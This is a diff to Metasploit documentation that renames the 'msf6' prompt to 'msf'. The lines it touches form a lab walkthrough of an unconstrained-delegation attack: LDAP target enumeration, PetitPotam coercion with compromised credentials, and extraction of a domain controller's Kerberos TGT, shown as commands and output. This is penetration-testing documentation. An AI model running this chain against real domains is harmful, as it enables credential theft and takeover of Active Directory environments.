@@ -46,18 +46,18 @@ and should be ignored as targets.
 
 Use the `ENUM_UNCONSTRAINED_DELEGATION` action to enumerate targets:
 ```
-msf6 > use auxiliary/gather/ldap_query
-msf6 auxiliary(gather/ldap_query) > set RHOSTS 192.168.159.10
+msf > use auxiliary/gather/ldap_query
+msf auxiliary(gather/ldap_query) > set RHOSTS 192.168.159.10
 RHOSTS => 192.168.159.10
-msf6 auxiliary(gather/ldap_query) > set DOMAIN msflab.local
+msf auxiliary(gather/ldap_query) > set DOMAIN msflab.local
 DOMAIN => msflab.local
-msf6 auxiliary(gather/ldap_query) > set USERNAME aliddle
+msf auxiliary(gather/ldap_query) > set USERNAME aliddle
 USERNAME => aliddle
-msf6 auxiliary(gather/ldap_query) > set PASSWORD Password1!
+msf auxiliary(gather/ldap_query) > set PASSWORD Password1!
 PASSWORD => Password1!
-msf6 auxiliary(gather/ldap_query) > set ACTION ENUM_UNCONSTRAINED_DELEGATION 
+msf auxiliary(gather/ldap_query) > set ACTION ENUM_UNCONSTRAINED_DELEGATION 
 ACTION => ENUM_UNCONSTRAINED_DELEGATION
-msf6 auxiliary(gather/ldap_query) > run
+msf auxiliary(gather/ldap_query) > run
 [*] Running module against 192.168.159.10
 
 [*] Discovering base DN automatically
@@ -83,16 +83,16 @@ CN=DC OU=Domain Controllers DC=msflab DC=local
  samaccountname  DC$
 
 [*] Auxiliary module execution completed
-msf6 auxiliary(gather/ldap_query) > 
+msf auxiliary(gather/ldap_query) > 
 ```
 
 This results in two potential targets, WS01 and DC. Next, use the `ENUM_DOMAIN_CONTROLLERS` action to identify the
 domain controllers to remove from the list of potential targets.
 
 ```
-msf6 auxiliary(gather/ldap_query) > set ACTION ENUM_DOMAIN_CONTROLLERS 
+msf auxiliary(gather/ldap_query) > set ACTION ENUM_DOMAIN_CONTROLLERS 
 ACTION => ENUM_DOMAIN_CONTROLLERS
-msf6 auxiliary(gather/ldap_query) > run
+msf auxiliary(gather/ldap_query) > run
 [*] Running module against 192.168.159.10
 
 [*] Discovering base DN automatically
@@ -110,7 +110,7 @@ CN=DC OU=Domain Controllers DC=msflab DC=local
  operatingsystemversion  10.0 (17763)
 
 [*] Auxiliary module execution completed
-msf6 auxiliary(gather/ldap_query) >
+msf auxiliary(gather/ldap_query) >
 ```
 
 This shows that DC is a domain controller and should be removed from the list, leaving WS01 as the only viable target.
@@ -124,21 +124,21 @@ remaining options including `RHOSTS` to the domain controller, and `SMBUser` / `
 compromised domain account.
 
 ```
-msf6 > use auxiliary/scanner/dcerpc/petitpotam 
-msf6 auxiliary(scanner/dcerpc/petitpotam) > set LISTENER ws01.msflab.local
+msf > use auxiliary/scanner/dcerpc/petitpotam 
+msf auxiliary(scanner/dcerpc/petitpotam) > set LISTENER ws01.msflab.local
 LISTENER => ws01.msflab.local
-msf6 auxiliary(scanner/dcerpc/petitpotam) > set SMBUser aliddle
+msf auxiliary(scanner/dcerpc/petitpotam) > set SMBUser aliddle
 SMBUser => aliddle
-msf6 auxiliary(scanner/dcerpc/petitpotam) > set SMBPass Password1!
+msf auxiliary(scanner/dcerpc/petitpotam) > set SMBPass Password1!
 SMBPass => Password1!
-msf6 auxiliary(scanner/dcerpc/petitpotam) > set RHOSTS 192.168.159.10
+msf auxiliary(scanner/dcerpc/petitpotam) > set RHOSTS 192.168.159.10
 RHOSTS => 192.168.159.10
-msf6 auxiliary(scanner/dcerpc/petitpotam) > run
+msf auxiliary(scanner/dcerpc/petitpotam) > run
 
 [+] 192.168.159.10:445    - Server responded with ERROR_BAD_NETPATH which indicates that the attack was successful
 [*] 192.168.159.10:445    - Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf6 auxiliary(scanner/dcerpc/petitpotam) >
+msf auxiliary(scanner/dcerpc/petitpotam) >
 ```
 
 If the module does not indicate that the attack was successful, another tool like
@@ -150,12 +150,12 @@ from the compromised host. If the attack was successful there should be at least
 computer account.
 
 ```
-msf6 > use post/windows/manage/kerberos_tickets 
-msf6 post(windows/manage/kerberos_tickets) > set SESSION -1
+msf > use post/windows/manage/kerberos_tickets 
+msf post(windows/manage/kerberos_tickets) > set SESSION -1
 SESSION => -1
-msf6 post(windows/manage/kerberos_tickets) > set SERVICE krbtgt/*
+msf post(windows/manage/kerberos_tickets) > set SERVICE krbtgt/*
 SERVICE => krbtgt/*
-msf6 post(windows/manage/kerberos_tickets) > run
+msf post(windows/manage/kerberos_tickets) > run
 
 [*] LSA Handle: 0x000001efe1c415a0
 [*] LogonSession LUID: 0x00004bc1d 
@@ -208,7 +208,7 @@ In this case, a TGT for the `MSFLAB\DC$` account was obtained through the logon 
 ticket was stored to disk in a ccache file. The ticket can also be seen in the output of `klist`.
 
 ```
-msf6 post(windows/manage/kerberos_tickets) > klist
+msf post(windows/manage/kerberos_tickets) > klist
 Kerberos Cache
 ==============
 id   host            principal               sname                             issued                     status  path
@@ -216,7 +216,7 @@ id   host            principal               sname                             i
 411  192.168.159.10  DC$@MSFLAB.LOCAL        krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL  2023-08-23 09:32:46 -0400  active  /home/smcintyre/.msf4/loot/20230823151744_default_192.168.159.10_mit.kerberos.cca_307418.bin
 407  192.168.159.10  WS01$@MSFLAB.LOCAL      krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL  2023-08-23 15:14:46 -0400  active  /home/smcintyre/.msf4/loot/20230823151735_default_192.168.159.10_mit.kerberos.cca_760842.bin
 
-msf6 post(windows/manage/kerberos_tickets) > 
+msf post(windows/manage/kerberos_tickets) > 
 ```
 
 ### Using The Ticket
